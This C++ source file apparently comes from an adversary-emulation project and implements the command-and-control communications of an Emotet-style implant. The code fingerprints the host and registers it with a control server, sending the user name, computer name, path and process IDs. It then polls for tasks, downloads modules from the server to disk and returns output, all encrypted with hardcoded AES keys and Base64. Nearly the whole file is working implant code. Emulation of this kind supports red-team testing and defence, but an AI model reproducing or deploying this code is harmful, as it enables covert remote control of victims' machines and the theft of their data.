#include "pch.h"
#include "comms.h"
#include "base64.h"
#include "AES.h"
#include "sha1.h"
#include "hostdiscovery.h"

// constructor
EmotetComms::EmotetComms(void) {
    this->machineID = this->generateMachineID();
}

// destructor
EmotetComms::~EmotetComms(void) {};

/*
 * generateMachineID:
 *      About:
 *          Generates the machine id for C2
 *      Result:
 *          Returns the machine ID as a string
 *      CTI:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
string EmotetComms::generateMachineID() {
    char machine_id[SHA256_ASCII_LEN] = { 0 };
    LPSTR lpBuffer = new char[SHA256LEN];
    DWORD size = SHA256LEN;
    if (!GetComputerNameA(lpBuffer, &size)) {
        printf("Unable to retrieve computer name\n");
        return "";
    }
    LPSTR lpVolumeNameBuffer = new char[MAX_PATH];
    DWORD lpVolumeSerialNumber = 0;
    DWORD lpFileSystemFlags = 0;
    DWORD lpMaximumComponentLength = 0;
    LPSTR lpFileSystemNameBuffer = new char[MAX_PATH];

    if (!GetVolumeInformationA(NULL, lpVolumeNameBuffer, MAX_PATH, &lpVolumeSerialNumber,
                                &lpMaximumComponentLength, &lpFileSystemFlags, 
                                lpFileSystemNameBuffer, MAX_PATH)) {
        printf("Unable to retrieve computer name\n");
        return "";
    }

    if(snprintf(machine_id, SHA256_ASCII_LEN, "%s_%08X", lpBuffer, lpVolumeSerialNumber) > 0)
        return machine_id;
    // Return empty string if it failed
    return "";
}

/*
 * getModulePath
 *      About:
 *          Gets module path via the current working directory and given
 *          module name
 *      Result:
 *          Returns module path if it is able to get current directory
 */
string EmotetComms::getModulePath(string moduleName) {
    string modulePath = "";
    string currentDir = getCurrentDirectory();
    if (currentDir.size() == 0) return "";
    modulePath = currentDir + "\\" + moduleName;
    return modulePath;
}

/*
 * getMachineIDLength:
 *      About:
 *          Retrieves length of given machine ID
 *      Result:
 *          Returns length of machine ID
 *      CTI:
 *          https://unit42.paloaltonetworks.com/emotet-command-and-control/
 */
int EmotetComms::getMachineIDLength(string machineID) {
    return machineID.length();
}

/*
 * checkIfFileExists:
 *      About:
 *          Checks if file exists by looking at the file attributes
 *      Result:
 *          Boolean, true if it already exists
 */
bool checkIfFileExists(string filepath) {
    DWORD dwAttrib = GetFileAttributesA(filepath.c_str());
    if (dwAttrib == INVALID_FILE_ATTRIBUTES) return false;

    HANDLE hFile = CreateFileA(filepath.c_str(),
        GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);

    if (hFile != NULL) {
        LARGE_INTEGER fSize;
        if (GetFileSizeEx(hFile, &fSize)) {
            CloseHandle(hFile);
            if (fSize.QuadPart > 0) {
                return true;
            }
        }
    }
    return false;
}

/*
 * installModule:
 *      About:
 *          Downloads file from C2 if it is not already installed
 *      Result:
 *          Boolean, true if it was installed, false if errors were found
 */
bool EmotetComms::installModule(string moduleRequested, string path) {
    // Return if file already exists
    if (checkIfFileExists(path)) return this->sendOutput("module already installed");
    string url = "/modules";
    string result = this->sendRequest(L"GET", IP_ADDRESS, url, moduleRequested, path);
    if (result.length()) {
        // Send confirmation to C2
        return this->sendOutput("successfully installed module");
    }

    this->sendOutput("failed to install module");
    return false;
}

/*
 * sendOutput:
 *      About:
 *          Sends POST request to control server with output data
 *      Result:
 *          Boolean, true if it output was sent successfully
 */
bool EmotetComms::sendOutput(string data) {
    string url = "/output";
    string response = this->sendRequest(L"POST", IP_ADDRESS, url, data, "");
    if (strstr(response.c_str(), "successfully set task output")) return true;
    return false;
}

/*
 * trimPadding:
 *      About:
 *          Trim padding until hashes match
 *      Result:
 *          Returns string with contents if hashes match
 */
string EmotetComms::trimPadding(string plaintext, string hash) {
    for (int i = plaintext.size()-1; i >= 0; i--) {
        // Generate hash
        char generatedHash[SHA1_HEX_SIZE];
        sha1(plaintext.c_str()).finalize().print_hex(generatedHash);

        if (strstr(hash.c_str(), generatedHash)) {
            return plaintext;
        }
        else {
            plaintext.erase(plaintext.size() - 1);
        }
    }
    return plaintext;
}

/*
 * getPayloadSizeStr:
 *      About:
 *          Retrives payload size of decrypted payload
 *      Result:
 *          Returns string of size of decrypted payload from given
 *          string
 */
string EmotetComms::getPayloadSizeStr(string base64decoded) {
    string payloadSizeStr = "";
    for (int i = 0; i < base64decoded.size(); i++) {
        if (base64decoded[i] == 0x3D) {
            return payloadSizeStr;
        }
        payloadSizeStr += base64decoded[i];
    }
    return payloadSizeStr;
}

/*
 * decodeDecrypt:
 *      About:
 *          Decodes and decrypts given string. Stores it in a file if a 
 *          filepath is given.
 *          Base64 encoding and AES decryption with SHA1 hash validation.
 *      Result:
 *          Returns string that contains decoded and decrypted payload
 *          or "success" if stored in a file provided by filepath argument
 *      CTI Reference:
 *          https://www.fortinet.com/blog/threat-research/deep-dive-into-emotet-malware
 */
string EmotetComms::decodeDecrypt(string cipherText, string filepath) {

    if (cipherText.size() == 0) return "";

    // Decode Base64
    string base64Decoded = base64_decode(cipherText, false);

    // Grab SHA1 hash
    string hash = base64Decoded.substr(0, 40);

    // Remove hash from base64Decoded
    base64Decoded.erase(0, 40);

    // Grab payload size
    string payloadSizeStr = getPayloadSizeStr(base64Decoded);
    int payloadSize = stoi(payloadSizeStr);

    // Remove payload size from base64Decoded
    base64Decoded.erase(0, payloadSizeStr.size()+1);

    // Decrypt AES
    AES aes(128);

    int encryptedLength = payloadSize;
    while (encryptedLength % 16 != 0) {
        encryptedLength += 1;
    }

    // add extra 16 for AES front padding
    encryptedLength += 16;

    unsigned char aes_key[] = { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x00 };
    unsigned char iv[] = { 0000000000000000 };
    unsigned char* decrypted = aes.DecryptCBC((unsigned char*)base64Decoded.c_str(), encryptedLength, aes_key, (unsigned char*)iv);

    // Remove first 16 characters from decrypted blob which contain AES blob
    for (int i = 0; i < payloadSize+16; i++) {
        decrypted[i] = decrypted[i + 16];
    }

    // Write to file
    if (filepath.size() != 0) {
        FILE* pFile = NULL;
        if (fopen_s(&pFile, filepath.c_str(), "w+b") != 0) {
            return "";
        }
        fwrite(decrypted, (size_t)1, (size_t)payloadSize, pFile);
        if (!fclose(pFile)) {
            return "success";
        }
        return "";
    }
    string plaintext = trimPadding(string((char *)decrypted), hash);
    return plaintext;
}

/*
 * encryptEncode:
 *      About:
 *          Computes hash of payload, then encrypts and encodes payload.
 *          AES 128 for encryption and base64 for encoding.
 *      Result:
 *          Returns base64 encoded string
 *      CTI Reference:
 *          https://www.fortinet.com/blog/threat-research/deep-dive-into-emotet-malware
 */
string encryptEncode(string payload) {
    // Hash of payload
    char hash[SHA1_HEX_SIZE];
    sha1(payload.c_str()).finalize().print_hex(hash);
    int hashLen = strlen(hash);

    // payload size with delimeter
    string payloadSizeStr = to_string(payload.size()) + "=";
    int payloadSizeStrLen = payloadSizeStr.size();

    // Front padding for AES
    payload = "0000000000000000" + payload;
    
    // Add padding
    while (payload.size() % 16 != 0) {
        payload += "=";
    }

    // Encrypt AES
    AES aes(128);
    unsigned char aes_key[] = { 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x37, 0x38, 0x39, 0x30, 0x31, 0x32, 0x33, 0x34, 0x35, 0x36, 0x00 };
    const int payloadLength = payload.size();
    unsigned char iv[] = { 0000000000000000 };
    unsigned int outLen = 0;

    unsigned char* encrypted = aes.EncryptCBC((unsigned char*)payload.c_str(), payloadLength, aes_key, (unsigned char*)iv, outLen);

    int bufsize = (outLen + hashLen + payloadSizeStrLen + 1);
    unsigned char* encryptedWithHash = (unsigned char*)calloc(bufsize+1, bufsize + 1);

    if (encryptedWithHash == NULL) {
        return "";
    }

    // Copy hash
    for (int i = 0; i < hashLen; i++) {
        encryptedWithHash[i] = hash[i];
    }

    // Copy payload size
    for (int i = 0; i < payloadSizeStrLen; i++) {
        encryptedWithHash[i+hashLen] = payloadSizeStr[i];
    }

    // Copy encrypted string
    for (int i = 0; i < outLen; i++) {
        encryptedWithHash[i+hashLen+payloadSizeStrLen] = encrypted[i];
    }

    // Add null byte at the end
    encryptedWithHash[hashLen + payloadSizeStrLen + outLen] = 0;

    // Encode with Base64
    string encodedPayload = base64_encode((unsigned char*)encryptedWithHash, bufsize+1, false);

    free(encryptedWithHash);
    return encodedPayload;
}

/*
 * sendRequest:
 *      About:
 *          Sends HTTP request
 *      Result:
 *          Returns 0 if request fails
 */
string EmotetComms::sendRequest(LPCWSTR requestType, string ip, string url, string data, string filepath) {
    DWORD dwSize = 0;
    DWORD dwDownloaded = 0;
    LPSTR pszOutBuffer = { 0 };
    BOOL  bResults = FALSE;
    HINTERNET  hSession = NULL,
        hConnect = NULL,
        hRequest = NULL;

    // Prepare payload
    string payload = this->machineID + ":" + data;

    // Encrypt payload
    string encryptedEncodedPayload = encryptEncode(payload);

    std::wstring host = std::wstring(ip.begin(), ip.end());
    std::wstring urlpath = std::wstring(url.begin(), url.end());
    
    // Use WinHttpOpen to obtain a session handle.
    hSession = WinHttpOpen(L"WinHTTP Example/1.0",
        WINHTTP_ACCESS_TYPE_DEFAULT_PROXY,
        WINHTTP_NO_PROXY_NAME,
        WINHTTP_NO_PROXY_BYPASS, 0);

    // Specify an HTTP server.
    if (hSession)
        hConnect = WinHttpConnect(hSession, host.c_str(),
            INTERNET_DEFAULT_HTTP_PORT, 0);
    
    // Create an HTTP request handle.
    if (hConnect)
        hRequest = WinHttpOpenRequest(hConnect, requestType, urlpath.c_str(),
            NULL, WINHTTP_NO_REFERER,
            WINHTTP_DEFAULT_ACCEPT_TYPES,
            0);

    // Send a request.
    if (hRequest) {
        bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0, 
                                        (LPVOID)encryptedEncodedPayload.c_str(), encryptedEncodedPayload.size(),
                                        encryptedEncodedPayload.size(), 0);
    }

    // End the request.
    if (bResults)
        bResults = WinHttpReceiveResponse(hRequest, NULL);
    
    string encodedData = "";

    // Keep checking for data until there is nothing left.
    if (bResults)
    {
        do
        {
            // Check for available data.
            dwSize = 0;
            if (!WinHttpQueryDataAvailable(hRequest, &dwSize))
                printf("Error %u in WinHttpQueryDataAvailable.\n",
                    GetLastError());
            // Allocate space for the buffer.
            pszOutBuffer = new char[dwSize + 1];
            if (!pszOutBuffer)
            {
                printf("Out of memory\n");
                dwSize = 0;
            }
            else
            {
                // Read the data.
                ZeroMemory(pszOutBuffer, dwSize + 1);

                if (!WinHttpReadData(hRequest, (LPVOID)pszOutBuffer,
                    dwSize, &dwDownloaded))
                    printf("Error %u in WinHttpReadData.\n", GetLastError());
                else {
                    // Add to encoded data blob
                    encodedData += pszOutBuffer;
                }
                // Free the memory allocated to the buffer.
                delete [] pszOutBuffer;

            }
        } while (dwSize > 0);
    }
    // Report any errors.
    if (!bResults)
        printf("Error %d has occurred.\n", GetLastError());

    // Close any open handles.
    if (hRequest) WinHttpCloseHandle(hRequest);
    if (hConnect) WinHttpCloseHandle(hConnect);
    if (hSession) WinHttpCloseHandle(hSession);

    if (filepath.length()) {
        return decodeDecrypt(encodedData, filepath);
    }
    else {
        return decodeDecrypt(encodedData, "");
    }

    return "failed";
}

/*
 * registerImplant:
 *      About:
 *          Registers implant with control server
 *      Result:
 *          Returns boolean on registration
 */
bool EmotetComms::registerImplant() {
    string registerEndpoint = "/";

    // For the purpose of the evaluation, additional data will be sent
    // to the control server
    string registrationData = getUser() + ";;" + getComputerName() + ";;" + getCWD() + ";;" + getPID() + ";;" + getPPID();

    string response = this->sendRequest(L"POST", IP_ADDRESS, registerEndpoint, registrationData, "");
    // Check if registered
    if (strstr(response.c_str(), "already exists") || strstr(response.c_str(), "success"))
        return true;

    return false;
}

string EmotetComms::getUser() {
    const DWORD pcbBuffer = 512;
    char lpBuffer[pcbBuffer];
    DWORD pcbBufferOut;
    if (GetUserNameA(
        lpBuffer,
        &pcbBufferOut
    ) == 0) {
        return "user not found";
    }
    return lpBuffer;
}

string EmotetComms::getComputerName() {
    DWORD size = MAX_COMPUTERNAME_LENGTH + 1;
    LPWSTR name = new wchar_t[size];
    std::vector<char> info_pcName;
    GetComputerNameW(name, &size);
    return std::string(CW2A(name));
}

string EmotetComms::getCWD() {
    DWORD size = MAX_PATH + 1;
    LPWSTR fullpath = new wchar_t[size];
    int bytes = GetModuleFileName(NULL, fullpath, size);
    std::string path = std::string(CW2A(fullpath));
    std::size_t botDirPos = path.find_last_of("\\");
    std::string dir = path.substr(0, botDirPos);
    return(dir);
}

string EmotetComms::getPID() {
    DWORD process = 0;
    process = GetCurrentProcessId();
    return (std::to_string(process));
}

string EmotetComms::getPPID() {
    DWORD process = 0;
    DWORD ppid = 0;
    HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 pe = { 0 };
    pe.dwSize = sizeof(PROCESSENTRY32);
    process = GetCurrentProcessId();

    if (Process32First(h, &pe)) {
        do {
            if (pe.th32ProcessID == process) {
                ppid = pe.th32ParentProcessID;
            }
        } while (Process32Next(h, &pe));
    }
    CloseHandle(h);
    return (std::to_string(ppid));
}

/*
 * registerImplant:
 *      About:
 *          Registers implant with control server
 *      Result:
 *          Returns boolean on registration
 */
string EmotetComms::getTask() {
    string getTaskEndpoint = "/getTask";
    string response = this->sendRequest(L"GET", IP_ADDRESS, getTaskEndpoint, "", "");
    return response;
}
